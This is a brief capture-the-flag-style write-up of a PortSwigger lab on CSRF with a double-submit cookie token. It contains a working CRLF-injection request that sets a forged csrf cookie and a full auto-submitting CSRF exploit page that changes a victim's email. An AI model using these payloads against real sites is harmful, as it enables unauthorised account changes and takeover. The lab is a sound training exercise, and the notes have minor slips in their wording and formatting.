# Lab: CSRF where token is duplicated in cookie
# https://portswigger.net/web-security/learning-paths/csrf/csrf-common-flaws-in-csrf-token-validation/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie

```bash
# Login to wiener:peter and update your password to abc@gmail.com
# Take change-email request and send it to repeater.
```

```bash
# csrf token and csrf cookie to this:

 VAEvcYQ7QxVHtscL6RlhzZyXOZGrsHYa

# change email and send request to see if it works.  

```

```bash
# Search test

GET /?search=test HTTP/2

# Response

HTTP/2 200 OK
Set-Cookie: LastSearchTerm=test;
```

```bash
GET /?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None HTTP/2

# Response:

HTTP/2 200 OK
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrf=fake; SameSite=None; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3440
``

```bash
<html>
  <body>
    <form action="https://0aa600fd03e38ed18311006a00b2002e.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="agc@gmail.com" />
      <input type="hidden" name="csrf" value="fake" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
    </script>
  <img src="https://0aa600fd03e38ed18311006a00b2002e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake" onerror="document.forms[0].submit();" />
  </body>
</html>
```
